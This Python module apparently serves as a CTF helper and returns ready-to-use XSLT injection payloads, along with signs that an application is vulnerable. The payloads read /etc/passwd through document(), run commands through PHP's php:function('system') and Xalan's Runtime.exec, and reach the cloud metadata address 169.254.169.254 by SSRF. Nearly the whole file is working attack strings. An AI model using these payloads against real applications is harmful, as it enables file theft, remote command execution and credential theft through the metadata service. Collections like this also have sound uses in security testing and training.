"""
XSLT Injection Payload Crafter for Web CTF.
Covers XSLT stylesheet injection for file read, command execution, and SSRF.
"""

from typing import List, Dict


def get_xslt_payloads() -> List[Dict[str, str]]:
    """Generate XSLT injection payloads."""
    return [
        {
            "name": "File Read (document())",
            "payload": """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>""",
            "desc": "Reads arbitrary file via document() function."
        },
        {
            "name": "Command Execution (php:function)",
            "payload": """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system', 'id')"/>
  </xsl:template>
</xsl:stylesheet>""",
            "desc": "Executes system command via php:function (PHP XSLT)."
        },
        {
            "name": "SSRF via XSLT",
            "payload": """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
  </xsl:template>
</xsl:stylesheet>""",
            "desc": "SSRF via document() to fetch internal URLs."
        },
        {
            "name": "Java Class Instantiation",
            "payload": """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java">
  <xsl:template match="/">
    <xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
  </xsl:template>
</xsl:stylesheet>""",
            "desc": "Java class instantiation for RCE (Xalan)."
        },
        {
            "name": "Environment Variable Disclosure",
            "payload": """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>""",
            "desc": "Discloses XSLT processor vendor."
        }
    ]


def get_xslt_indicators() -> List[Dict[str, str]]:
    """Indicators that XSLT injection is possible."""
    return [
        {
            "indicator": "XML with XSLT processing",
            "desc": "If the app processes XML with XSLT stylesheets."
        },
        {
            "indicator": "User-controlled XSLT",
            "desc": "If the app allows user-controlled XSLT stylesheets."
        },
        {
            "indicator": "XML transformation feature",
            "desc": "If the app has XML transformation/reporting features."
        }
    ]
